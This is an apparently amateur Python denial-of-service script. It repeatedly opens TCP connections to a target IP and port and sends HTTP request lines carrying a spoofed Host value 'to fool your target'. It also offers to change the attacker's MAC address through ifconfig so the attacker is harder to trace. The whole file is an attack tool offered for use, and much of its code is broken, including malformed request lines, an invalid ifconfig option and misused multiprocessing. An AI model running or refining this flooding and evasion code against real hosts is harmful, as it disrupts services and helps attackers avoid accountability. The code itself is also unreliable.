#! /usr/bin/python3.8

import socket
import multiprocessing
import optparse
import subprocess 
import re
import time
from colorama import Fore


GREEN = Fore.GREEN
RED = Fore.RED 

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-i","--ip",dest="ip",help="Type the ip of the target that you want to attack")
    parser.add_option("-f","--fake",dest="fake_ip",help="Type the a fake ip to fool your target")
    parser.add_option("-p","--port",dest="port",help="Type the your targets port")
    parser.add_option("-s","--process",dest="process",help="Type how process you want to start for this program")
    user_values = parser.parse_args()[0]
    if not user_values.ip:
        parser.error("Type the ip of your target,type --help for more info")
    elif not user_values.fake_ip:
        parser.error("Type a fake ip,type --help for more info")
    elif not user_values.port:
        parser.error("Type the port that you want to attack,type --help for more info")
    elif not user_values.process and user_values.process < 1:
        parser.error("Type the number of processes that you want to open for this program(1 is the minimum),type --help for more info")
    else:
        return user_values 

def start_socket(ip,fake_ip,port):
    while(True):
        connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        connection.connect((ip,port))
        connection.sendto(("GET/ " + ip + "HTTP1.1/" + "\r\n").encode(encoding="ascii"),(ip,port))
        connection.sendto(("Host " + fake_ip + "\r\n\r\n").encode(encoding="ascii"),(ip,port))
        print("Sent header!!")
        connection.close

def random_mac(interface):
    random_mac = [0,0,1,2,3,4,5,6,7,8,9,1]
    new_mac = []
    MAC = ""
    print("Checking your default MAC..")
    output = subprocess.check_output(["ifconfig",interface])
    mac_address = re.search("\w\w:\w\w:\w\w:\w\w:\w\w:\w\w",str(output))
    time.sleep(2)
    for element in random_mac:
        element = element + 1
        new_mac.append(element)  
    MAC = "0" + "0" + ":"
    MAC = MAC + str(new_mac[2]) + str(new_mac[3]) + ":" 
    MAC = MAC + str(new_mac[4]) + str(new_mac[5]) + ":"
    MAC = MAC + str(new_mac[6]) + str(new_mac[7]) + ":"
    MAC = MAC + str(new_mac[8]) + str(new_mac[9]) + ":"
    MAC = MAC + "1" + "1" 
    subprocess.call(["ifconfig",interface,"down"])
    subprocess.call(["ifconfig",interface,"hmac","ether",MAC])
    subprocess.call(["ifconfig",interface,"up"])
               
def is_alive(target_ip):
    if b"alive" in subprocess.check_output(["fping",target_ip]):
        return True
    else:
        return "Your target is down...stoping the attack"

def speed_up(number_processes,ip,fake_ip,port):
    counter = 0
    process_pool = []
    while(counter != number_processes):
        process = multiprocessing.Process(target=start_socket(ip,fake_ip,int(port)),daemon=True)
        process_pool.append(process)
        counter = counter + 1
        if counter == number_processes:
            break 
    for _process_ in process_pool: 
        _process_.start()
        _process_.join()

def check_mac(interface):
    print("Saving your current mac..")
    time.sleep(2)
    output = subprocess.check_output(["ifconfig",interface])
    result = re.search("\w\w:\w\w:\w\w:\w\w:w\w:\w\w",str(output))
    return result

def print_function():
    print("\t\t\t**********************************************************")
    print(f"\t\t\t\t\t\tWelcome")
    print("You want to change your MAC?")  
    valid_answers = ["yes","no"] 
    user_input = input()
    if user_input not in valid_answers:
        print("Type yes or no!!")
        user_input = input()
        if user_input == "yes":
            print("Type your network interface:")
            interface = input()
            current_mac = check_mac(interface)
            random_mac(interface)
            if current_mac == check_mac(interface):
                print("Error your mac didnt changed" + RED)
                exit(0)
            else:
                print("Your mac has successfully changed"+ GREEN)
        else:
            print("Starting the sockets...")
            time.sleep(3)
    else:
        print("Starting the sockets...")
        time.sleep(3)


user_values = get_arguments()
print_function()
if is_alive(user_values.ip) == True:
    speed_up(user_values.process,user_values.ip,user_values.fake_ip,user_values.port)
else:
    print("Host is down")
    